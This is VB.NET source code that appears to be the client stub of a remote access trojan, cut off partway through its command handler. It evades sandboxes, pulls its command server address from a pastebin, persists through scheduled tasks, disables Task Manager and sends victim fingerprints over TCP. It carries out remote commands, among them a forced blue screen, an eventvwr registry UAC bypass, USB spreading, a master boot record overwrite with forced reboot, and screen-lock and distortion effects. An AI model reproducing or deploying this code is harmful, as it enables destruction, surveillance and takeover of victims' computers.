Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System.Collections.Generic
Imports System.Threading
Imports System.IO.Compression
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography
Imports System.Linq
Imports System
Imports System.ComponentModel
Imports System.Text
Imports System.Security.Principal
Imports System.Net
Imports System.Reflection
Imports System.Globalization
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Security
Imports System.Net.NetworkInformation
Imports System.ServiceProcess
Imports System.Net.Sockets
Imports System.Environment
Imports System.Collections
Imports spredusb
Imports Stub


Namespace j


    <StandardModule()>
    Friend NotInheritable Class OK

        <DebuggerStepThrough(), CompilerGenerated()>
        Private Shared Sub _Lambda__1(ByVal a0 As Object)
            OK.Ind(DirectCast(a0, Byte()))

        End Sub

        <DebuggerStepThrough(), CompilerGenerated()>
        Private Shared Sub _Lambda__2(ByVal a0 As Object, ByVal a1 As SessionEndingEventArgs)
            OK.ED()
        End Sub

        Public Shared Function ACT() As String
            Dim str As String
            Try
                Dim foregroundWindow As IntPtr = OK.GetForegroundWindow
                If (foregroundWindow = IntPtr.Zero) Then
                    Return ""
                End If
                Dim winTitle As String = Strings.Space((OK.GetWindowTextLength(CLng(foregroundWindow)) + 1))
                OK.GetWindowText(foregroundWindow, winTitle, winTitle.Length)
                str = OK.ENB(winTitle)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = ""
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        Public Shared Function RN(ByVal c As Integer) As String
            Randomize()
            Dim r As New Random
            Dim s As String = ""
            Dim k As String = "abcdefghijklmnopqrstuvwxyz"
            For i As Integer = 1 To c
                s += k(r.Next(0, k.Length))
            Next
            Return s
        End Function

        'Monitor ON/OFF API
        Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)

        Dim MouseThread As Thread = New Thread(New ThreadStart(AddressOf Mouse))

        Private Shared Sub Mouse()
            Dim MouseThread As Thread = New Thread(New ThreadStart(AddressOf Mouse))
            Dim xxx As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim ooo As Integer = Screen.PrimaryScreen.Bounds.Height

            For x As Integer = 1 To 100

                Dim generator As New Random
                Dim randomValue As Integer
                Dim randomValue2 As Integer
                randomValue = generator.Next(0, ooo)
                randomValue2 = generator.Next(0, xxx)
                Dim mousepos As Point
                mousepos.X = randomValue
                mousepos.Y = randomValue2
                Windows.Forms.Cursor.Position = mousepos
                Threading.Thread.Sleep(50)

            Next
			
            MouseThread.Abort()

        End Sub

        Public Shared Function BS(ByRef B As Byte()) As String
            Return Encoding.UTF8.GetString(B)
        End Function

        Public Shared Function Cam() As Boolean
            Try
                Dim num As Integer = 0
                Do
                    Dim lpszVer As String = Nothing
                    If OK.capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                        Return True
                    End If
                    num += 1
                Loop While (num <= 4)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Return False
        End Function

        <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
        End Function

        Private Shared Function CompDir(ByVal F1 As FileInfo, ByVal F2 As FileInfo) As Boolean
            If (F1.Name.ToLower = F2.Name.ToLower) Then
                Dim directory As DirectoryInfo = F1.Directory
                Dim parent As DirectoryInfo = F2.Directory
                Do
                    If (directory.Name.ToLower <> parent.Name.ToLower) Then
                        Return False
                    End If
                    directory = directory.Parent
                    parent = parent.Parent
                    If ((directory Is Nothing) And (parent Is Nothing)) Then
                        Return True
                    End If
                    If (directory Is Nothing) Then
                        Return False
                    End If
                Loop While (Not parent Is Nothing)
            End If
            Return False
        End Function

        Public Shared Function connect() As Boolean

            If OK.ANYRUN Then
                If IO.File.Exists(IO.Path.GetTempPath & "sand.dat") Then
                    H = "127.0.0.1"
                Else
                    Dim NoSands As New Form2
                    NoSands.Show()
                    Threading.Thread.Sleep(2000)
                End If
                If IO.File.Exists(IO.Path.GetTempPath & "sand.dat") Then
                    H = "127.0.0.1"
                    UNS()
                    Application.Exit()
                    ProjectData.EndApp()
                Else
                End If
            End If

            If OK.PasteE Then
                Dim str As String = String.Empty
                Dim strArr() As String
                Dim count As Integer = 0
                Dim maxRetries As Integer = 50
                Dim currentRetry As Integer = 0
                Do Until Not String.IsNullOrEmpty(str) OrElse currentRetry >= maxRetries
                    Try
                        str = New WebClient().DownloadString(PASTEBIN)
                    Catch ex As Exception
                        currentRetry += 1
                        Threading.Thread.Sleep(5000)
                    End Try
                Loop

                If Not String.IsNullOrEmpty(str) Then
                    strArr = str.Split(":")
                    For count = 0 To strArr.Length - 1
                        OK.H = strArr(0)
                        OK.P = strArr(1)
                    Next
                Else
                    ProjectData.EndApp()
                End If
            End If

            OK.Cn = False
            Thread.Sleep(&H7D0)

            If OK.KProc Then
                Interaction.Shell(("taskkill /f im " & Proc), AppWinStyle.Hide, True, &H1388)
            End If

            If OK.TaskMGR Then
                Stub.NoTsk.Start()
            End If

            If OK.Sched Then
                Try
                    Interaction.Shell(("schtasks /delete /tn " & """" & OK.SCHEDNAME & """" & " /f"), AppWinStyle.Hide, True, &H1388)
                    Interaction.Shell(("schtasks /create /sc minute /mo 1 /tn " & """" & OK.SCHEDNAME & """" & " /tr " & AppDomain.CurrentDomain.BaseDirectory & IO.Path.GetFileName(Application.ExecutablePath)), AppWinStyle.Hide, True, &H1388)
                Catch exception8 As Exception
                    ProjectData.SetProjectError(exception8)
                    Dim exception3 As Exception = exception8
                    ProjectData.ClearProjectError()
                End Try
            End If

            Dim lO As FileInfo = OK.LO
            SyncLock lO
                Try
                    If (Not OK.C Is Nothing) Then
                        Try
                            OK.C.Close()
                            OK.C = Nothing
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    Try
                        OK.MeM.Dispose()
                    Catch exception6 As Exception
                        ProjectData.SetProjectError(exception6)
                        Dim exception2 As Exception = exception6
                        ProjectData.ClearProjectError()
                    End Try
                Catch exception7 As Exception
                    ProjectData.SetProjectError(exception7)
                    Dim exception3 As Exception = exception7
                    ProjectData.ClearProjectError()
                End Try
                Try
                    OK.MeM = New MemoryStream
                    OK.C = New TcpClient
                    OK.C.ReceiveBufferSize = &H32000
                    OK.C.SendBufferSize = &H32000
                    OK.C.Client.SendTimeout = &H2710
                    OK.C.Client.ReceiveTimeout = &H2710
                    OK.C.Connect(OK.H, Conversions.ToInteger(OK.P))
                    OK.Cn = True
                    OK.Send(OK.inf)
                    Try
                        Dim str As String
                        If Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", False) Then
                            str = (str & OK.DEB(OK.VN) & ChrW(13) & ChrW(10))
                        Else
                            str = (str & OK.DEB(Conversions.ToString(OK.GTV("vn", ""))) & ChrW(13) & ChrW(10))
                        End If
                        str = ((((((String.Concat(New String() {str, OK.H, ":", OK.P, ChrW(13) & ChrW(10)}) & OK.DR & ChrW(13) & ChrW(10)) & OK.EXE & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.Idr) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.IsF) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.Isu) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.BD))
                        OK.Send(("inf" & OK.Y & OK.ENB(str)))
                    Catch exception8 As Exception
                        ProjectData.SetProjectError(exception8)
                        Dim exception4 As Exception = exception8
                        ProjectData.ClearProjectError()
                    End Try
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception5 As Exception = exception9
                    OK.Cn = False
                    ProjectData.ClearProjectError()
                End Try
            End SyncLock
            Return OK.Cn
        End Function

        Public Shared Function DEB(ByRef s As String) As String
            Return OK.BS(Convert.FromBase64String(s))
        End Function

        Public Shared Sub DLV(ByVal n As String)
            Try
                OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG), True).DeleteValue(n)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub ED()
            OK.pr(0)
        End Sub

        Public Shared Function ENB(ByRef s As String) As String
            Return Convert.ToBase64String(OK.SB(s))
        End Function

        <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function GetForegroundWindow() As IntPtr
        End Function

        <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
        End Function

        <DllImport("user32.dll", EntryPoint:="GetWindowTextA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function GetWindowText(ByVal hWnd As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef WinTitle As String, ByVal MaxLength As Integer) As Integer
        End Function


        Public Shared Function GetAntiVirus() As String
            '' By AFHJQ
            Dim AV As String
            Dim fir As Integer
            Try
                Dim Sec As Integer
                Dim Thr As Integer
one:
                Thr = 1
                Dim obj4 As Object = "Select * From AntiVirusProduct"
two:
                Thr = 2
                Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\.\root\SecurityCenter2", Nothing))
thr:
                Thr = 3
                Dim arguments As Object() = New Object() {RuntimeHelpers.GetObjectValue(obj4)}
                Dim copyBack As Boolean() = New Boolean() {True}
                If copyBack(0) Then
                    obj4 = RuntimeHelpers.GetObjectValue(arguments(0))
                End If
                Dim Obf As Object = RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.NewLateBinding.LateGet(objectValue, Nothing, "ExecQuery", arguments, Nothing, Nothing, copyBack))
tori:
                Thr = 4
                Dim enumerator As IEnumerator = DirectCast(Obf, IEnumerable).GetEnumerator
                Do While enumerator.MoveNext
                    Dim instance As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
fiv:

                    Sec = 1
sx:
                    Thr = 6
                    AV = Microsoft.VisualBasic.CompilerServices.NewLateBinding.LateGet(instance, Nothing, "displayName", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString
                    GoTo Label_015D
sve:
                    Thr = 7
                Loop
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
nime:
                Thr = 8
                AV = "No AV"
                GoTo Label_015D
ly:
                fir = 0
                Select Case (fir + 1)
                    Case 1
                        GoTo one
                    Case 2
                        GoTo two
                    Case 3
                        GoTo thr
                    Case 4
                        GoTo tori
                    Case 5
                        GoTo fiv
                    Case 6
                        GoTo sx
                    Case 7
                        GoTo sve
                    Case 8
                        GoTo nime
                    Case 9
                        GoTo Label_015D
                    Case Else
                        GoTo Label_0152
                End Select
Label_011B:
                fir = Thr
                Select Case Sec
                    Case 0
                        GoTo Label_0152
                    Case 1
                        GoTo ly
                End Select
            Catch ex As Exception

                GoTo Label_011B
            End Try
Label_0152:

Label_015D:
            If (fir <> 0) Then

            End If
            Return AV

        End Function


        <DllImport("user32.dll", EntryPoint:="GetWindowTextLengthA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function GetWindowTextLength(ByVal hwnd As Long) As Integer
        End Function

        Public Shared Function GTV(ByVal n As String, ByVal ret As Object) As Object
            Dim obj2 As Object
            Try
                obj2 = OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG)).GetValue(n, RuntimeHelpers.GetObjectValue(ret))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                obj2 = ret
                ProjectData.ClearProjectError()
            End Try
            Return obj2
        End Function

        Public Shared Function HWD() As String
            Dim str As String
            Try
                Dim num As Integer
                Dim lpVolumeNameBuffer As String = Nothing
                Dim lpMaximumComponentLength As Integer = 0
                Dim lpFileSystemFlags As Integer = 0
                Dim lpFileSystemNameBuffer As String = Nothing
                OK.GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
                str = Conversion.Hex(num)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = "ERR"
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function


        <DllImport("KERNEL32.DLL")>
        Public Shared Sub Beep(ByVal freq As Integer, ByVal dur As Integer)

        End Sub


        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
        Private Shared Function FindWindow(
        ByVal lpClassName As String,
        ByVal lpWindowName As String) As IntPtr
        End Function

        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
        Private Shared Function ShowWindow(
        ByVal hwnd As IntPtr,
        ByVal nCmdShow As Int32) As Boolean
        End Function

        <DllImport("winmm.dll")>
        Private Shared Function mciSendString(ByVal command As String, ByVal buffer As String, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
        End Function

        <DllImport("user32.dll")>
        Private Shared Function ReleaseDC(ByVal hWnd As IntPtr, ByVal hDC As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("gdi32.dll")>
        Private Shared Function CreateSolidBrush(crColor As UInteger) As IntPtr
        End Function

        <DllImport("gdi32.dll")>
        Private Shared Function PatBlt(hdc As IntPtr, nXLeft As Integer, nYLeft As Integer, nWidth As Integer, nHeight As Integer, dwRop As TernaryRasterOperations) As Boolean
        End Function

        <DllImport("gdi32.dll", EntryPoint:="BitBlt", SetLastError:=True,
CharSet:=CharSet.Unicode, ExactSpelling:=True,
CallingConvention:=CallingConvention.StdCall)>
        Public Shared Function BitBlt(
ByVal hdcDest As IntPtr,
ByVal nXDest As Integer,
ByVal nYDest As Integer,
ByVal nWidth As Integer,
ByVal nHeight As Integer,
ByVal hdcSrc As IntPtr,
ByVal nXSrc As Integer,
ByVal nYSrc As Integer,
ByVal dwRop As Int32)
        End Function

        <DllImport("gdi32.dll")>
        Private Shared Function StretchBlt(ByVal hdcDest As IntPtr, ByVal nXOriginDest As Integer, ByVal nYOriginDest As Integer, ByVal nWidthDest As Integer, ByVal nHeightDest As Integer, ByVal hdcSrc As IntPtr, ByVal nXOriginSrc As Integer, ByVal nYOriginSrc As Integer, ByVal nWidthSrc As Integer, ByVal nHeightSrc As Integer, ByVal dwRop As TernaryRasterOperations) As Boolean

        End Function

        <DllImport("user32.dll")>
        Private Shared Function GetDesktopWindow() As IntPtr

        End Function

        <DllImport("user32.dll")>
        Private Shared Function GetWindowDC(ByVal hWnd As IntPtr) As IntPtr

        End Function

        <DllImport("gdi32")>
        Private Shared Function SelectObject(ByVal hdc As IntPtr, ByVal hgdiobj As IntPtr) As IntPtr
        End Function

        <DllImport("gdi32")>
        Private Shared Function DeleteObject(ByVal objectHandle As IntPtr) As Boolean
        End Function

        Private Const SRCCOPY = &HCC0020 ' (DWORD) dest = source

        Public Enum TernaryRasterOperations
            SRCCOPY = &HCC0020
            SRCPAINT = &HEE0086
            SRCAND = &H8800C6
            SRCINVERT = &H660046
            SRCERASE = &H440328
            NOTSRCCOPY = &H330008
            NOTSRCERASE = &H1100A6
            MERGECOPY = &HC000CA
            MERGEPAINT = &HBB0226
            PATCOPY = &HF00021
            PATPAINT = &HFB0A09
            PATINVERT = &H5A0049
            DSTINVERT = &H550009
            BLACKNESS = &H42
            WHITENESS = &HFF0062
        End Enum

        Private r As Random

        Private Enum SW As Int32
            Hide = 0
            Normal = 1
            ShowMinimized = 2
            ShowMaximized = 3
            ShowNoActivate = 4
            Show = 5
            Minimize = 6
            ShowMinNoActive = 7
            ShowNA = 8
            Restore = 9
            ShowDefault = 10
            ForceMinimize = 11
            Max = 11
        End Enum

        Private Enum GetWindow_Cmd As UInteger
            GW_HWNDFIRST = 0
            GW_HWNDLAST = 1
            GW_HWNDNEXT = 2
            GW_HWNDPREV = 3
            GW_OWNER = 4
            GW_CHILD = 5
            GW_ENABLEDPOPUP = 6
        End Enum

        Public Shared Function ZIP(ByVal B() As Byte, ByRef CM As Boolean) As Byte()
            If CM = True Then
                Dim M As Object = New IO.MemoryStream()
                Dim gZip As Object = New IO.Compression.GZipStream(M, CompressionMode.Compress, True)
                gZip.Write(B, 0, B.Length)
                gZip.Dispose()
                M.Position = 0
                Dim BF(M.Length) As Byte
                M.Read(BF, 0, BF.Length)
                M.Dispose()
                Return BF
            Else
                Dim M As Object = New IO.MemoryStream(B)
                Dim gZip As Object = New GZipStream(M, CompressionMode.Decompress)
                Dim buffer(3) As Byte
                M.Position = M.Length - 5
                M.Read(buffer, 0, 4)
                Dim size As Integer = BitConverter.ToInt32(buffer, 0)
                M.Position = 0
                Dim BF(size - 1) As Byte
                gZip.Read(BF, 0, size)
                gZip.Dispose()
                M.Dispose()
                Return BF
            End If
        End Function

        Public Shared BinaryPath As String

        Public Shared List As List(Of String)

        Public Shared _appMutex As Mutex

        Public Shared sp As String

        Public Shared MTX As String

        <DllImport("user32", CharSet:=CharSet.Auto, ExactSpelling:=False, SetLastError:=True)>
        Private Shared Function FindWindowEx(ByVal parentHandle As Integer, ByVal childAfter As Integer, ByRef lclassName As String, ByRef windowTitle As String) As Integer
        End Function

        Public Shared Function GETP(ByVal StrP As String) As Object
            Dim obj As Object
            obj = If(Not StrP.Contains("%Current%"), Environment.ExpandEnvironmentVariables(StrP), StrP.Replace("%Current%", AppDomain.CurrentDomain.BaseDirectory))
            Return obj
        End Function

        <DllImport("user32.dll", CharSet:=CharSet.None, ExactSpelling:=False)>
        Public Shared Function PostMessageW(ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As Integer, ByVal lParam As Integer) As Boolean
        End Function

        <DllImport("ntdll.dll")>
        Private Shared Function NtRaiseHardError(ByVal ErrorStatus As UInteger, ByVal NumberOfParameters As UInteger, ByVal UnicodeStringParameterMask As UInteger, ByVal Parameters As IntPtr, ByVal ValidResponseOption As UInteger, <Out()> ByRef Response As UInteger) As UInteger
        End Function

        <DllImport("ntdll.dll")>
        Public Shared Function RtlAdjustPrivilege(ByVal Privilege As Integer, ByVal bEnablePrivilege As Boolean, ByVal IsThreadPrivilege As Boolean, <Out> ByRef PreviousValue As Boolean) As UInteger
        End Function
        Public Shared Sub Ind(ByVal b As Byte())
            Dim strArray As String() = Strings.Split(OK.BS(b), OK.Y, -1, CompareMethod.Binary)
            Try
                Dim buffer As Byte()
                Dim str4 As String = strArray(0)
                Dim A As String() = Split(BS(b), Y)

                Select Case str4

                    Case "bsod"
                        Dim previousValue As Boolean
                        RtlAdjustPrivilege(19, True, False, previousValue)
                        Dim Response As UInteger
                        NtRaiseHardError(&HC0000156UI, 0, 0, IntPtr.Zero, 6, Response)
                        'NtRaiseHardError(&HC0000350UI, 0, 0, IntPtr.Zero, 6, Response)
                        '(Petya's BSOD Style)
                        '' Want to cause a different BSOD, get the whole list of BSOD errors here:
                        '' https://hetmanrecovery.com/recovery_news/bsod-errors
                        Return

                    Case "persis"
                        Persistence.Startup()
                        Return


                    Case "UACbyp"
                        Try
                            Dim str As String = String.Concat("%SystemRoot%\system32\mmc.exe", " ""%1"" %*")
                            Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Classes\mscfile\shell\open\command").SetValue("", AppDomain.CurrentDomain.BaseDirectory + (IO.Path.GetFileName(Application.ExecutablePath)))
                            Process.Start("eventvwr.exe")
                            System.Threading.Thread.Sleep(500)
                            Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Classes\mscfile\shell\open\command").SetValue("", str)
                            ProjectData.EndApp()
                        Catch ex As Exception
                        End Try
                        Return

                    Case "checkin"
                        Try
                            File.Create("C://win.dat").Close()
                            OK.Send(("MSG" & OK.Y & "Check: You have admin rights."))
                            File.Delete("C://win.dat")
                        Catch ex As Exception
                            If ex.ToString.Contains("denied") Then
                                OK.Send(("MSG" & OK.Y & "Check: You have no admin rights."))
                            End If
                        End Try
                        Exit Select

                    Case "Runas"
                        Try
                            Dim procInfo As New ProcessStartInfo()
                            procInfo.UseShellExecute = True
                            procInfo.FileName = (IO.Path.GetFileName(Application.ExecutablePath))
                            procInfo.WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory
                            procInfo.Verb = "runas"
                            Process.Start(procInfo)
                            ProjectData.EndApp()
                        Catch ex As Exception
                        End Try
                        Exit Select

                    Case "schedtasks"
                        Interaction.Shell(("schtasks /create /sc minute /mo 1 /tn " & SCHEDNAME & " /tr " & AppDomain.CurrentDomain.BaseDirectory & IO.Path.GetFileName(Application.ExecutablePath)), AppWinStyle.Hide, True, &H1388)
                        Exit Select

                    Case "unschedtasks"
                        Interaction.Shell(("schtasks /delete /tn " & SCHEDNAME & " /f"), AppWinStyle.Hide, True, &H1388)
                        Exit Select

                    Case "spreadusbme"
                        spredusb.Start()
                        Return

                    Case "restartme"
                        Shell("shutdown -r -t 00 -f", AppWinStyle.Hide)
                        Return

                    Case "shutdowm"
                        Shell("shutdown -s -t 00 -f", AppWinStyle.Hide)
                        Return

                    Case "FuckMBR"
                        Try
                            File.Create("C://test.txt").Close()
                            OK.Send(("MSG" & OK.Y & "MBR Overwritten, Victim rebooted."))
                            MBRSlayer.Start()
                            Interaction.Shell(("cmd /c start shutdown /r /f /t 3"), AppWinStyle.Hide, True, &H1388)
                            File.Delete("C://test.txt")
                        Catch ex As Exception
                            If ex.ToString.Contains("denied") Then
                                OK.Send(("MSG" & OK.Y & "Can't overwrite MBR. (No admin)"))
                            End If
                        End Try
                        Exit Select

                    Case "FuckMBRNR"
                        Try
                            File.Create("C://test.txt").Close()
                            OK.Send(("MSG" & OK.Y & "MBR Overwritten."))
                            MBRSlayer.Start()
                            File.Delete("C://test.txt")
                        Catch ex As Exception
                            If ex.ToString.Contains("denied") Then
                                OK.Send(("MSG" & OK.Y & "Can't overwrite MBR. (No admin)"))
                            End If
                        End Try

                    Case "Flip"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                        Exit Select

                    Case "mirror"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                        Exit Select

                    Case "Invert"

                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY)

                        Exit Select

                    Case "Flashbang"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.WHITENESS)
                        Exit Select

                    Case "LightsOut"

                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.BLACKNESS)
                        Exit Select

                    Case "boing"

                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                        Exit Select

                    Case "lockon"
                        NTTA = "on"
                        Stub.NoTska.Start()
                        Dim file As System.IO.StreamWriter
                        file = My.Computer.FileSystem.OpenTextFileWriter(IO.Path.GetTempPath & "select.dat", True)
                        file.WriteLine("002")
                        file.Close()
                        Try
                            Dim NoBa As New Form1
                            NoBa.Show()
                        Catch ex As Exception
                        End Try
                        Exit Select

                    Case "lockoff"
                        NTTA = "Love"
                        Try
                            If System.IO.File.Exists(IO.Path.GetTempPath & "select.dat") = True Then
                                System.IO.File.Delete(IO.Path.GetTempPath & "select.dat")
                            End If
                        Catch
                        End Try
                        Exit Select

                    Case "rainbow"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        Dim fuck As New Random
                        Dim brush As IntPtr = CreateSolidBrush(CUInt(fuck.Next(0, &HFFFFFF + 1)))
                        SelectObject(hdc, brush)
                        PatBlt(hdc, 0, 0, x, y, CopyPixelOperation.PatInvert)
                        DeleteObject(brush)
                        Exit Select

                    Case "sysicos"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        Dim random As New Random()
                        For i As Integer = 0 To 10
                            Dim systemIcon As Icon
                            Select Case random.Next(6)
                                Case 0
                                    systemIcon = SystemIcons.Error
                                Case 1
                                    systemIcon = SystemIcons.Warning
                                Case 2
                                    systemIcon = SystemIcons.Information
                                Case 3
                                    systemIcon = SystemIcons.WinLogo
                                Case 4
                                    systemIcon = SystemIcons.Shield
                                Case 5
                                    systemIcon = SystemIcons.Application
                            End Select
                            Dim iconWidth As Integer = systemIcon.Width
                            Dim iconHeight As Integer = systemIcon.Height
                            Dim iconX As Integer = random.Next(x - iconWidth)
                            Dim iconY As Integer = random.Next(y - iconHeight)
                            Dim graphics As Graphics = Graphics.FromHdc(hdc)
                            graphics.DrawIcon(systemIcon, iconX, iconY)
                            graphics.Dispose()
                        Next
                        ReleaseDC(hwnd, hdc)
                        Exit Select

                    Case "lines"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        Dim crazyPen As New Pen(Color.Black, 10)
                        crazyPen.StartCap = LineCap.Round
                        crazyPen.EndCap = LineCap.Round
                        Dim graphics As Graphics = Graphics.FromHdc(hdc)
                        Dim points As New List(Of Point)
                        Dim random As New Random()
                        points.Add(New Point(random.Next(x), random.Next(y)))
                        For i As Integer = 1 To 99
                            Dim randomColor As Color = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256))
                            crazyPen.Color = randomColor
                            crazyPen.Width = 15
                            Dim cx1 As Integer = points(i - 1).X + random.Next(-50, 51)
                            Dim cy1 As Integer = points(i - 1).Y + random.Next(-50, 51)
                            Dim cx2 As Integer = points(i - 1).X + random.Next(-50, 51)
                            Dim cy2 As Integer = points(i - 1).Y + random.Next(-50, 51)
                            Dim endPoint As New Point(random.Next(x), random.Next(y))
                            points.Add(endPoint)
                            graphics.DrawBezier(crazyPen, points(i - 1), New Point(cx1, cy1), New Point(cx2, cy2), endPoint)
                        Next
                        crazyPen.Dispose()
                        graphics.Dispose()
                        ReleaseDC(hwnd, hdc)
                        Exit Select

                    Case "icocrazy"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height

                        Dim random As New Random()

                        For i As Integer = 0 To 10 ' Change 10 to the number of icons you want to draw
                            Dim systemIcon As Icon
                            Select Case random.Next(6)
                                Case 0
                                    systemIcon = SystemIcons.Error
                                Case 1
                                    systemIcon = SystemIcons.Warning
                                Case 2
                                    systemIcon = SystemIcons.Information
                                Case 3
                                    systemIcon = SystemIcons.WinLogo
                                Case 4
                                    systemIcon = SystemIcons.Shield
                                Case 5
                                    systemIcon = SystemIcons.Application
                            End Select

